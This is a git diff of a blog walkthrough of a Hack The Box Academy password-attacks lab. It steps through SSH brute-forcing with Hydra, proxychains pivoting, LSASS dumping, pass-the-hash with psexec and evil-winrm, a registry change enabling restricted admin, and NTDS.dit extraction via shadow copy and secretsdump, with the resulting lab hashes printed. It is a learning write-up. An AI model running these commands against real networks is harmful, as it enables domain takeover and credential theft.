@@ -1,6 +1,6 @@
 ---
 date: '2025-07-16T011:22:00-05:00'
-draft: true
+draft: false
 title: 'The Credential Theft Shuffle'
 tags:
   - Hackthebox
@@ -9,10 +9,10 @@ tags:
   - Pass The Hash
   - Acrive Directory
 ---
-## 1. Intro
+## 01. Intro
 I was doing the Password Attacks lab in hackthebox academy and I found it pretty interesting so I figured I would redo it and step through how I did it and my thought process to help solidify concepts and because I enjoyed this one, even though it was a bit frustrating initially.
 
-## 2. Gathering Initial Info
+## 02. Gathering Initial Info
  To start this engagement we know a couple things. We have a user Betty Jade that works at  Nexura LLC. We also have a password for the user `Texas123!@#` with a reasonable assumption that she reuses passwords. We also have the scope of this engagement with the following devices:
 |Host|IP Address|
 |---|---|
@@ -47,6 +47,7 @@ PORT     STATE  SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
 ```
+## 04. Gaining Initial Access
 From here we can see that SSH is open. Since we have a possible password but no username. We can create a list of possible usernames based on the name Betty Jayde using [Username-Anarchy](https://github.com/urbanadventurer/username-anarchy) and brute forcing the resulting usernames using [Hydra](https://www.kali.org/tools/hydra/)
 ```
 th@ddeu$ git clone https://github.com/urbanadventurer/username-anarchy.git
@@ -93,6 +94,7 @@ jbetty@DMZ01:~$ less -N .bash_history
      66 su - testuser
 --SNIP--
 ```
+## 05. Pivoting out of the DMZ
 The testuser line seemed pretty interesting as we could potentially use that to get root access to this machine, unfortunately that user no longer exists. Next the 192.168.0.101 machine is out of scope. Lastly we can see potential credentials to FILE01, which is in scope. So when I first tried to go about this, i spent too much time trying to escalate privileges on this machine so that i could use [chisel](https://github.com/jpillora/chisel) or to be able to ssh tunnel since that was locked down. Turns out all i needed to do was use the built in SSH SOCKS5 Proxy and proxychains my traffic through to the target machines. 
 ```
 th@ddeu$ ssh -D 9050 jbetty@10.129.39.174
@@ -122,6 +124,7 @@ th@ddeu$ sudo proxychains nmap -Pn -sT -p 21-23,80,135,443,445,3389,5985,5986,80
      65 3389/tcp open   ms-wbt-server
      66 5985/tcp open   wsman
 ```
+## 06. Gaining Access to FILE01
 Lets Focus on the ports that we have open on FILE01, we can see that we can access this machine a few different ways, lets try the least intrusive method of checking the shares available first, and maybe connecting through psexec, we can also try to RDP but i typically save that for a last resort.
 ```
 th@ddeu$ sudo proxychains smbclient -U "NEXURA\hwilliam%dealer-screwed-gym1" -L //172.16.119.10
@@ -191,9 +194,9 @@ michaeljackson   (Employee-Passwords_OLD)
 th@ddeu$ sudo apt install passwordsafe
 th@ddeu$ 
 ```
-From here we have to download the app and open the gui to copy and paste out the passwords.
+From here we have to download the app and open the gui to copy and paste out the passwords.  \
 ![Lockscreen](./20250716_passwordsafe_lockscreen.PNG)
-![Unlocked](./20250716_passwordsafe_unlocked.PNG)
+![Unlocked](./20250716_passwordsafe_unlocked.PNG)  \
 The resulting creds are as follows
 ```
 #DMZ01
@@ -203,6 +206,7 @@ The resulting creds are as follows
 ## stom / fails-nibble-disturb4
 ## hwilliam / warned-wobble-occur8
 ```
+## 07. Gaining Access to JUMP01
 Taking a look ath these creds, the only ones that are still valid are bdavid's unfortunately his credentials dont give us access to any files of interest
 ```
 th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%caramel-cigars-reply1" -L //172.16.119.10
@@ -222,7 +226,7 @@ th@ddeu$ sudo proxychains smbclient -U "NEXURA\bdavid%caramel-cigars-reply1" -L 
 ```
 From here we can use our newly found credentials to attempt remote access to the other machines. For brevity's sake im going to omit the numerous failed attempts, but i tried psexec and xfreerdp on both other machines with both sets of credentials, and was able to get on to the JUMP01 server with bdavid via rdp.
 ```
-proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:'caramel-cigars-reply1' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
+th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:'caramel-cigars-reply1' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
 ```
 A quick check shows us that bdavid is allowed to launch an administrative shell which makes our lives a lot easier. At this point we can upload mimikatz if we would like, but i wanted to try the method of dumping LSASS since for some reason it wouldnt work for me in the earlier labs using the GUI method in Task Manager
 ![Lsass Dump](./20250726_lsass.PNG)
@@ -247,14 +251,72 @@ th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
     299                 DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
 --SNIP--
 ```
-At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine
+At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine via RDP.
+## 08. Gaining Access to DC01
 ```
 th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :21ea958524cfd9a7791737f8d2f764fa
 --SNIP--
 Microsoft Windows [Version 10.0.17763.2628]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32>
+C:\Windows\system32> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:stom /pth:'21ea958524cfd9a7791737f8d2f764fa' /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
+```
+This did not work so im going to back out and use evil-winrm to connect to the machine
+```
+th@ddeu$ sudo apt install krb5-user
+th@ddeu$ sudo vim /etc/krb5.conf
+# MAKE SURE YOUR CONF HAS THE FOLLOWING
+--SNIP--
+     default_realm = NEXURA.HTB
+--SNIP--
+[realms]
+     NEXURA.HTB = {
+          kdc = DC01.NEXURA.HTB
+     }
+--SNIP--
+th@ddeu$ sudo vim /etc/hosts
+--SNIP--
+#MAKE SURE YOUR FILE HAS THE FOLLOWING
+172.16.119.11 DC01 dc01 DC01.NEXURA.HTB dc01.nexura.htb NEXURA.HTB nexura.htb
+--SNIP--
+th@ddeu$ proxychains evil-winrm -i DC01 -u stom -H 21ea958524cfd9a7791737f8d2f764fa 
+*Evil-WinRM* PS C:\Users\stom\Documents> 
 ```
 Now that we have access to the system we can try to grab the SYSTEM and ntds.dit files to dump them and get the administrator hash that we need to pass this lab.We can do this most easily by just creating a volume shadow copy and copying the files to our local system
 
+```
+*Evil-WinRM* PS C:\Users\stom\Documents> vssadmin CREATE SHADOW /for=C: 
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool                           
+(C) Copyright 2001-2013 Microsoft Corp.                                
+Successfully created shadow copy for 'C:\'                                                               
+    Shadow Copy ID: {1a19cedf-7113-402f-a03a-cfc2bf69bb9c}                                Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
+
+*Evil-WinRM* PS C:\Users\stom\Documents> cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
+
+*Evil-WinRM* PS C:\Users\stom\Documents> cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SYSTEM C:\SYSTEM
+# THIS TAKES A WHILE
+*Evil-WinRM* PS C:\Users\stom\Documents> download C:\ntds.dit
+*Evil-WinRM* PS C:\Users\stom\Documents> download C:\SYSTEM
+```
+## 09. Cracking the creds
+Finally we can use secretsdump to grab the hash we need for this challenge
+```
+th@ddeu$ impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM LOCAL                                                                                                                
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies
+[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778                                        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
+[*] Reading and decrypting hashes from ./NTDS.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:9d80cee28b2e985285a43a7c4eb3122c:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
+nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::
+nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa::: 
+nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::
+FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::
+JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321:::
+
+```
